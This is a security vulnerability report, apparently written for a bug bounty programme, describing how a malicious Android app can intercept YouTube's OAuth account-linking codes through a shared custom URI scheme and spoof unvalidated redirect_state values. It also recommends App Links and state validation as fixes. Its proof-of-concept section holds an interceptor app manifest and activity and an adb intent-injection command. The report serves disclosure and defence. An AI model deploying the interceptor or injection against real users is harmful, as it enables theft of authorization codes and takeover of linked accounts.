# VRP Report #38: YouTube AccountLinkingActivity Custom Scheme OAuth Code Interception

## Summary
YouTube's `AccountLinkingActivity` handles OAuth callbacks via the custom URI scheme `com.google.android.apps.youtube://oauth2redirect`. Since Android custom URI schemes are not exclusive, any malicious app can register an intent filter for the same scheme and intercept OAuth authorization codes during account linking flows. Additionally, the WebOAuth flow (tsb fragment) does not validate the `redirect_state` parameter against a stored expected value, unlike the App Flip flow which correctly validates state.

## Affected Component
- **App**: YouTube (`com.google.android.youtube`)
- **Component**: `com.google.android.libraries.accountlinking.activity.AccountLinkingActivity`
- **Type**: Activity
- **Exported**: true
- **Permission**: NONE
- **Launch Mode**: singleInstance

## Vulnerability Details

### Manifest Declaration
```xml
<activity android:exported="true"
    android:launchMode="singleInstance"
    android:name="com.google.android.libraries.accountlinking.activity.AccountLinkingActivity"
    android:theme="@android:style/Theme.Translucent.NoTitleBar">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="vnd.youtube.gdi"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:host="oauth2redirect"
              android:scheme="com.google.android.apps.youtube"/>
    </intent-filter>
</activity>
```

### Issue 1: Custom Scheme Interception (MEDIUM-HIGH)

Android custom URI schemes (`com.google.android.apps.youtube://`) are NOT exclusive — any app can register an intent filter for the same scheme. During OAuth:

1. YouTube opens a browser to the OAuth authorization URL
2. User authenticates and authorizes
3. OAuth server redirects to: `com.google.android.apps.youtube://oauth2redirect?redirect_state=AUTH_CODE`
4. Android resolves the intent — if a malicious app registered the same scheme, it may receive the redirect instead of YouTube

**WebOAuth flow code (tsb.java):**
```java
// Browser launched with OAuth URL:
intent3.setData(Uri.parse(str3));  // str3 = OAuth auth_url
startActivityForResult((Intent) obj, 1001);
```

The authorization code arrives via the redirect URI's `redirect_state` query parameter.

### Issue 2: Missing State Validation in WebOAuth Flow (MEDIUM)

**WebOAuth flow (tsb fragment, onNewIntent lines 517-525):**
```java
// redirect_state extracted WITHOUT validation against stored value
String queryParameter3 = data.getQueryParameter("redirect_state");
if (TextUtils.isEmpty(queryParameter3)) {
    truVarA = tsb.a;   // error
} else {
    truVarA = tru.a(2, queryParameter3);  // Accepts ANY value
}
tsbVar.e.a(truVarA);  // Passes to flow handler
```

**Compare with App Flip flow (trw fragment, lines 557-563) which IS correct:**
```java
String queryParameter5 = data.getQueryParameter("state");
if (queryParameter5 == null || !queryParameter5.equals(trwVar.e) || ...) {
    // Error - state mismatch (CORRECT behavior)
}
```

The WebOAuth flow trusts any `redirect_state` value without verifying it matches the expected state. An attacker can inject a crafted intent during an active OAuth flow.

## Proof of Concept

### Malicious app manifest (intercepts OAuth redirects):
```xml
<activity android:name=".OAuthInterceptActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="com.google.android.apps.youtube"
              android:host="oauth2redirect"/>
    </intent-filter>
</activity>
```

```java
public class OAuthInterceptActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri data = getIntent().getData();
        if (data != null) {
            String authCode = data.getQueryParameter("redirect_state");
            Log.d("INTERCEPT", "OAuth auth code: " + authCode);
            // Attacker now has the authorization code
        }
    }
}
```

### Via ADB (state injection):
```bash
adb shell am start -a android.intent.action.VIEW \
  -d "com.google.android.apps.youtube://oauth2redirect?redirect_state=SPOOFED_CODE" \
  -n com.google.android.youtube/com.google.android.libraries.accountlinking.activity.AccountLinkingActivity
```

## Impact

### OAuth Code Theft (MEDIUM-HIGH)
- A malicious app registered for the same custom scheme can intercept the OAuth authorization code
- The authorization code can potentially be exchanged for access tokens at the OAuth server
- This enables unauthorized access to the user's linked third-party account
- Per RFC 8252 Section 8.1, custom schemes are explicitly identified as vulnerable to this attack

### OAuth Flow Disruption (MEDIUM)
- An attacker can inject a crafted intent to disrupt an active account linking flow
- The missing state validation allows spoofed redirect_state values
- The singleInstance launch mode means injected intents via onNewIntent() affect the existing activity

### Attack Scenarios
1. **Account takeover**: Malicious app intercepts OAuth code during third-party account linking → exchanges code for token → gains access to linked account
2. **Phishing amplification**: Attacker pre-populates a fake OAuth completion screen to trick the user into believing linking succeeded with an attacker-controlled account
3. **Session fixation**: Attacker injects their own OAuth state/code to link the victim's YouTube to an attacker-controlled third-party account

## Severity Assessment
- **Confidentiality**: HIGH (OAuth authorization code leaked)
- **Integrity**: HIGH (account linking flow can be hijacked)
- **User Interaction**: Required (user must initiate account linking)
- **Permissions Required**: NONE (any installed app)
- **Attack Complexity**: LOW (standard intent filter registration)

## Fix Recommendation

### For Custom Scheme Interception:
Migrate to Android App Links with domain verification:
```xml
<intent-filter android:autoVerify="true">
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="https"
          android:host="youtube.com"
          android:pathPrefix="/oauth2redirect"/>
</intent-filter>
```

### For Missing State Validation:
Implement PKCE (RFC 7636) and client-side state validation:
```java
// Before launching browser:
String expectedState = generateSecureRandom();
storeState(expectedState);

// On redirect:
String receivedState = data.getQueryParameter("redirect_state");
if (!expectedState.equals(receivedState)) {
    // Reject — state mismatch
}
```

## Device / Build
- Pixel 6a, Android 17 (API 37), Build CP2A.260605.012
- YouTube as bundled
